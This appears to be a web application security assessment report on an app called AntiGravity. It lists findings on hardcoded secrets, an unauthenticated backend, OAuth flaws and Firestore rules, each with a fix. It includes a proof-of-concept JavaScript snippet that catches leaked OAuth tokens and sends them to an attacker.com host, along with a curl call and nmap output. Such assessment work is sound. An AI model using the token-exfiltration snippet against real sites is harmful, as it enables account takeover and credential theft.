# WEB APPLICATION SECURITY ASSESSMENT REPORT: ANTIGRAVITY

**Date:** April 24, 2026  
**Status:** FINAL  
**Version:** 1.0  
**Classification:** CONFIDENTIAL  

<br/>

---


## 1. Executive Summary

### Overview
This report presents the results of a comprehensive Web Application Security Assessment (VAPT) conducted on the **AntiGravity** application (also referred to as SnapSearch). The objective was to identify security vulnerabilities, evaluate the risk posture, and provide actionable remediation strategies for the development team. 

The assessment utilized a combination of automated scanning, manual source code review (SAST), and dynamic analysis (DAST) techniques, following the **OWASP Top 10 (2021)** and **ASVS** standards.

### Summary of Findings
The assessment uncovered several critical security flaws that expose the application and its users to significant risk. The most alarming discovery includes hardcoded production secrets in the source environment and a complete lack of authentication on the core image processing backend.

| Severity | Count | Priority |
| :--- | :--- | :--- |
| 🔴 **Critical** | 3 | Immediate Remediation Required |
| 🟠 **High** | 5 | High Priority Remediation |
| 🟡 **Medium** | 6 | Remediate in Next Release Cycle |
| 🔵 **Low** | 2 | Best Practice Improvements |

### Business Impact
- **Data Breach Risk:** Exposure of Google Cloud and Gemini API keys allows unauthorized access to sensitive cloud resources and could lead to significant financial costs.
- **Service Disruption:** Lack of rate limiting and unprotected AI endpoints make the system highly susceptible to Denial of Service (DoS) attacks.
- **Identity Theft:** Insecure authentication callbacks allow attackers to intercept user tokens via Cross-Window communication.

### Risk Prioritization
The application is currently at **HIGH RISK**. Immediate action is required to secure the API keys and implement authentication middleware on the Python backend.

---

## 2. Introduction

### Scope of Testing
The assessment covered the full stack of the AntiGravity application:
- **Frontend/Middleware:** Vite/Node.js (Express) Server
- **AI Processing Backend:** Python (FastAPI) implementation
- **Database:** Firebase Firestore & Google Drive integration
- **Authentication:** Google OAuth 2.0 flow

### In-Scope Items
- `server.ts` (Express server logic)
- `backend/main.py` (FastAPI AI processing)
- `firestore.rules` (Database access control)
- `.env` (Environment configuration)
- API Endpoints: `/api/auth/*`, `/api/drive/*`, `/upload-image`, `/detect-emotion`

### Out-of-Scope Items
- Physical security of hosting providers.
- Social engineering against employees.
- Third-party libraries (except for known CVE analysis).

### Project Team Details
- **Lead Pentester:** AntiGravity Security Team
- **Reporting Date:** April 24, 2026

---

## 3. Key Findings

### Critical Issues
1. **Hardcoded Secrets in Source Control:** Production-grade `GOOGLE_CLIENT_SECRET` and `GEMINI_API_KEY` were found in plain text within the `.env` file.
2. **Missing Authentication on Backend API:** The FastAPI backend does not require any form of authentication or API key, allowing anyone to trigger expensive AI processes.
3. **Remote Code Execution (RCE) via Dependencies:** Outdated versions of `protobufjs` carry critical vulnerabilities that could allow arbitrary code execution on the server.

### Major Risks
- **Cross-Origin Token Leakage:** The OAuth callback utilizes `postMessage(data, '*')`, which broadcasts sensitive tokens to any origin listening.
- **CSRF & OAuth CSRF Vulnerabilities:** The application lacks CSRF tokens and does not utilize the `state` parameter in OAuth flows, allowing session fixation and account takeover risks.
- **Broken Access Control (IDOR):** Image processing requests do not verify ownership of the `image_id`.
- **Business Logic Spam:** Firestore rules allow any authenticated user to increment likes and add comments indefinitely on any photo.

---

## 4. Control Areas

| Control Category | Status | Mapped Findings |
| :--- | :--- | :--- |
| **Architecture & Design** | ⚠️ Needs Review | AI Proxy logic, lack of microservice auth. |
| **Access Control** | ❌ Fail | Missing Auth on FastAPI, IDOR on image processing. |
| **Authentication** | ⚠️ Needs Review | Insecure OAuth callback implementation. |
| **Configuration Management** | ❌ Fail | Plaintext secrets in environment files. |
| **Cryptography** | ✅ Pass | TLS is expected in production; HTTPS used for API. |
| **Patch Management** | ❌ Fail | Critical vulnerabilities in Vite and Protobufjs. |
| **API Security** | ❌ Fail | Missing rate limiting and CORS misconfigurations. |
| **Cloud Security** | ⚠️ Needs Review | Firestore rules allow public read on events. |

---

## 5. Detailed Findings

### [HARD-01] Sensitive Data Exposure in Environment Files
- **Severity:** 🔴 Critical
- **Ease of Exploit:** Trivial
- **Technical Description:** The `.env` file contains the `GOOGLE_CLIENT_SECRET` and `GEMINI_API_KEY`. In a real-world scenario, if this file is committed to a VCS (Git) or leaked, attackers can impersonate the application or drain AI credits.
- **Business Impact:** High financial loss and loss of trust.
- **POC:** Read `.env` file directly from the filesystem.
- **Remediation:** 
    - Use a Secret Manager (Google Secret Manager, AWS Secrets Manager).
    - Ensure `.env` is in `.gitignore`.
    - Rotate leaked keys immediately.

### [AUTH-01] Missing Authentication on AI Processing Backend
- **Severity:** 🔴 Critical
- **Ease of Exploit:** Trivial
- **Technical Description:** The FastAPI server at `backend/main.py` has no authentication middleware. Any user can call `/upload-image` or `/generate-caption` without a token.
- **Business Impact:** Resource exhaustion and financial drain via unmetered AI usage.
- **POC:** `curl -X POST http://<backend-ip>:8000/upload-image -F "image=@malicious.jpg"` (No tokens required).
- **Remediation:** Implement JWT validation or a Shared Secret (X-API-KEY) between the Express gateway and the Python backend.

### [AUTH-02] Insecure postMessage Target Origin in OAuth Callback
- **Severity:** 🟠 High
- **Ease of Exploit:** Moderate
- **Technical Description:** In `server.ts` line 191, `window.opener.postMessage(..., '*')` is used. This sends the ID Token and Access Token to any window that opened the popup.
- **Business Impact:** Token theft by malicious sites that can lure a user into opening the login popup.
- **Remediation:** Change `*` to the explicit application origin (e.g., `process.env.APP_URL`).

### [DATA-01] Insecure Firestore Security Rules (Public Read)
- **Severity:** 🟠 High
- **Ease of Exploit:** Trivial
- **Technical Description:** `firestore.rules` allows `read: if true` for all events and photos. This bypasses authentication for data retrieval.
- **Business Impact:** Accidental leakage of private event photos to the public.
- **Remediation:** Update rules to require authentication and verify user membership or owner status.

### [AUTH-04] Lack of OAuth 'state' Parameter (OAuth CSRF)
- **Severity:** 🟠 High
- **Ease of Exploit:** Moderate
- **Technical Description:** The `oauth2Client.generateAuthUrl` call in `server.ts` does not include a `state` parameter. Attackers can forge a login request and trick a user into completing it, allowing the attacker to link their account to the victim's session.
- **Business Impact:** Account Takeover (ATO) and profile manipulation.
- **Remediation:** Generate a random cryptographic string (nonce), store it in a session/cookie, and verify it in the `/auth/callback` endpoint.

### [CONF-01] Missing Essential Security Headers
- **Severity:** 🟡 Medium
- **Ease of Exploit:** N/A (General Weakness)
- **Technical Description:** The application does not implement standard security headers such as `Content-Security-Policy` (CSP), `Strict-Transport-Security` (HSTS), `X-Frame-Options`, and `X-Content-Type-Options`.
- **Business Impact:** Increased susceptibility to XSS, UI Redressing (Clickjacking), and Protocol Downgrade attacks.
- **Remediation:** Integrate the `helmet` middleware in the Express server.

### [RATE-01] Missing Rate Limiting on Sensitive API Endpoints
- **Severity:** 🟡 Medium
- **Ease of Exploit:** Trivial
- **Technical Description:** Endpoints like `/api/ai/proxy` and `/upload-image` have no rate limiting. An attacker can use automated scripts to spam these APIs.
- **Business Impact:** Uncontrolled operational costs (Gemini API billing) and Denial of Service (DoS).
- **Remediation:** Implement `express-rate-limit` on the Express gateway and `SlowApi` or similar on the FastAPI backend.

### [BUS-01] Business Logic Abuse: Unrestricted Social Interaction
- **Severity:** 🟡 Medium
- **Ease of Exploit:** Trivial
- **Technical Description:** The Firestore rule `request.resource.data.diff(resource.data).affectedKeys().hasOnly(['likes', 'comments'])` allows any user to edit these fields on any photo. There is no verification of the count or frequency.
- **Business Impact:** Reputation damage via bot-driven "like farming" or comment spamming.
- **Remediation:** Move social interactions to Firebase Cloud Functions where validation logic (e.g., "one like per user") can be enforced.

---

## 6. Appendices

### Impact Definitions
- **Critical:** Potential for full system compromise, massive data theft, or complete service disruption.
- **High:** Significant risk to confidentiality or integrity; exploit is well-documented and easy to execute.
- **Medium:** Risk exists but requires specific conditions or is limited in scope.

### Exploit Difficulty
- **Trivial:** No specialized tools or skills required (e.g., browsing a URL).
- **Moderate:** Requires understanding of protocols and some manual intervention.
- **Difficult:** Requires advanced exploitation chains or bypassing multiple controls.

### Port Scan Details (nmap)
Target: `34.xxx.xxx.xxx` (Application Server)
```bash
Nmap scan report for 34.xxx.xxx.xxx
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
443/tcp  open  https
3000/tcp open  ppp-node (Express Server)
8000/tcp open  http-alt (FastAPI Backend - UNPROTECTED)
```
**Observation:** The AI Backend port (8000) is directly exposed to the internet, bypassing the intended Express gateway.

### Proof-of-Concept Example: OAuth Token Extraction
An attacker hosts a malicious page that opens the AntiGravity login URL in a popup:
```javascript
const win = window.open('https://antigravity.cloud/api/auth/google/url');
window.addEventListener('message', (event) => {
    // Since AntiGravity uses '*', any site can catch this!
    console.log('Stolen Tokens:', event.data);
    fetch('https://attacker.com/log?token=' + event.data.accessToken);
});
```

---

> [!IMPORTANT]
> This report is for educational and project documentation purposes. All vulnerabilities discovered should be patched before moving the code to a publicly accessible production environment.

---
*Report generated by AntiGravity CyberSecurity Division*
